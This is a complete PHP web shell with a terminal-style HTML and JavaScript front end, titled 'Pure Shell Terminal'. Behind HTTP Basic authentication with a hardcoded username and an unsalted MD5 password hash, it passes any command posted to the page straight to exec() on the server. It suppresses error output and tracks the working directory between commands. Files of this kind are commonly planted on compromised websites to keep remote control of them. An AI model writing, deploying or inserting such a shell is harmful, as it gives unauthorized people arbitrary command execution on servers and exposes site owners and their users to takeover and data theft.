<?php
// 禁止所有错误输出
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

session_start();

// 配置
define('AUTH_USER', 'homo114514');
define('AUTH_PASS_MD5', '77b3e6926e7295494dd3be91c6934899');

// 验证
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
        if ($_SERVER['PHP_AUTH_USER'] === AUTH_USER && md5($_SERVER['PHP_AUTH_PW']) === AUTH_PASS_MD5) {
            $_SESSION['auth'] = true;
            $_SESSION['cwd'] = getcwd();
        } else {
            header('WWW-Authenticate: Basic realm="Shell"');
            header('HTTP/1.0 401 Unauthorized');
            echo 'Unauthorized';
            exit;
        }
    } else {
        header('WWW-Authenticate: Basic realm="Shell"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'Unauthorized';
        exit;
    }
}

// 处理AJAX请求
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    header('Content-Type: text/plain; charset=utf-8');
    
    $cmd = $_POST['cmd'] ?? '';
    $cwd = $_SESSION['cwd'] ?? getcwd();
    
    if ($cmd === 'clear') {
        echo "\033[2J\033[H";
        exit;
    }
    
    if ($cmd === 'exit') {
        echo "exit\n";
        exit;
    }
    
    // 切换目录并执行命令
    $fullCmd = sprintf('cd %s 2>/dev/null; %s 2>&1', escapeshellarg($cwd), $cmd);
    $output = [];
    $ret = 0;
    exec($fullCmd, $output, $ret);
    
    // 更新当前目录
    $pwdCmd = sprintf('cd %s 2>/dev/null && pwd', escapeshellarg($cwd));
    exec($pwdCmd, $pwdOut);
    if (!empty($pwdOut)) {
        $_SESSION['cwd'] = $pwdOut[0];
    }
    
    // 输出结果
    if (!empty($output)) {
        echo implode("\n", $output);
    } elseif ($ret !== 0) {
        echo "Command failed with exit code: $ret";
    }
    
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pure Shell Terminal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', 'Monaco', monospace;
            height: 100vh;
            overflow: hidden;
            padding: 10px;
        }
        #terminal {
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }
        #output {
            flex: 1;
            white-space: pre-wrap;
            font-family: monospace;
            font-size: 14px;
            line-height: 1.4;
        }
        .input-row {
            display: flex;
            align-items: center;
            margin-top: 5px;
            position: sticky;
            bottom: 0;
            background: #000;
        }
        .prompt {
            color: #0f0;
            white-space: pre;
            font-family: monospace;
        }
        #cmd {
            flex: 1;
            background: transparent;
            border: none;
            color: #0f0;
            font-family: monospace;
            font-size: 14px;
            outline: none;
            padding: 2px 0;
        }
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #111;
        }
        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 4px;
        }
    </style>
</head>
<body>
<div id="terminal">
    <div id="output">Pure Shell Terminal v1.0
Type commands directly.
==========================================
</div>
    <div class="input-row">
        <span class="prompt" id="prompt">$ </span>
        <input type="text" id="cmd" autocomplete="off" spellcheck="false" autofocus>
    </div>
</div>

<script>
    let history = [];
    let historyIdx = -1;
    let currentInput = '';
    let prompt = '$ ';
    
    const outputDiv = document.getElementById('output');
    const cmdInput = document.getElementById('cmd');
    const terminal = document.getElementById('terminal');
    const promptSpan = document.getElementById('prompt');
    
    cmdInput.focus();
    
    function addOutput(text) {
        const lines = text.split('\n');
        for (let line of lines) {
            const div = document.createElement('div');
            div.textContent = line;
            div.style.whiteSpace = 'pre-wrap';
            div.style.fontFamily = 'monospace';
            outputDiv.appendChild(div);
        }
        scrollToBottom();
    }
    
    function scrollToBottom() {
        terminal.scrollTop = terminal.scrollHeight;
    }
    
    async function execCmd(cmd) {
        if (!cmd.trim()) return;
        
        // 显示输入的命令
        addOutput(prompt + cmd);
        
        // 处理clear
        if (cmd === 'clear') {
            outputDiv.innerHTML = '';
            return;
        }
        
        // 处理exit
        if (cmd === 'exit') {
            addOutput('Goodbye!');
            setTimeout(() => location.reload(), 500);
            return;
        }
        
        try {
            const formData = new FormData();
            formData.append('cmd', cmd);
            
            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });
            
            if (!response.ok) {
                throw new Error('HTTP ' + response.status);
            }
            
            const text = await response.text();
            if (text && text.trim()) {
                addOutput(text);
            }
        } catch(err) {
            addOutput('Error: ' + err.message);
        }
    }
    
    cmdInput.addEventListener('keypress', async (e) => {
        if (e.key === 'Enter') {
            const cmd = cmdInput.value;
            await execCmd(cmd);
            
            if (cmd.trim() && cmd !== 'clear' && cmd !== 'exit') {
                history.unshift(cmd);
                if (history.length > 200) history.pop();
            }
            historyIdx = -1;
            currentInput = '';
            cmdInput.value = '';
        }
    });
    
    cmdInput.addEventListener('keydown', (e) => {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIdx < history.length - 1) {
                if (historyIdx === -1) currentInput = cmdInput.value;
                historyIdx++;
                cmdInput.value = history[historyIdx];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIdx > 0) {
                historyIdx--;
                cmdInput.value = history[historyIdx];
            } else if (historyIdx === 0) {
                historyIdx = -1;
                cmdInput.value = currentInput;
            }
        } else if (e.ctrlKey && e.key === 'l') {
            e.preventDefault();
            outputDiv.innerHTML = '';
        }
    });
    
    terminal.addEventListener('click', () => cmdInput.focus());
    
    // 禁用Ctrl+R刷新
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && (e.key === 'r' || e.key === 'R')) {
            e.preventDefault();
            return false;
        }
    });
    
    // 更新提示符（如果服务器返回了新提示符）
    async function updatePrompt() {
        // 提示符由前端维护，或者可以通过执行echo $PS1获取
        // 简单起见，使用默认$
    }
    
    scrollToBottom();
</script>
</body>
</html>